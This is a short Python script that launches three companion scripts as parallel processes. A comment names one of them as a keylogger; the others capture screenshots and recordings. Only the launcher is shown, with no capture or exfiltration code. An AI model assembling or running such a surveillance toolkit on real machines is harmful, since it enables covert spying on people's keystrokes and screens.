import subprocess
import os

# Get the folder where your scripts are
script_folder = os.path.dirname(os.path.abspath(__file__))

# Paths to the separate scripts
keylogger_script = os.path.join(script_folder, "main.py")
screenshot_script = os.path.join(script_folder, "screen.py")
recording_script = os.path.join(script_folder, "rec.py")

# Start each script as a separate process
processes = []
processes.append(subprocess.Popen(["python", keylogger_script]))
processes.append(subprocess.Popen(["python", screenshot_script]))
processes.append(subprocess.Popen(["python", recording_script]))

print("All scripts started. Press Ctrl+C to stop.")

try:
    # Wait for all processes to finish
    for p in processes:
        p.wait()
except KeyboardInterrupt:
    print("Stopping all scripts...")
    for p in processes:
        p.terminate()
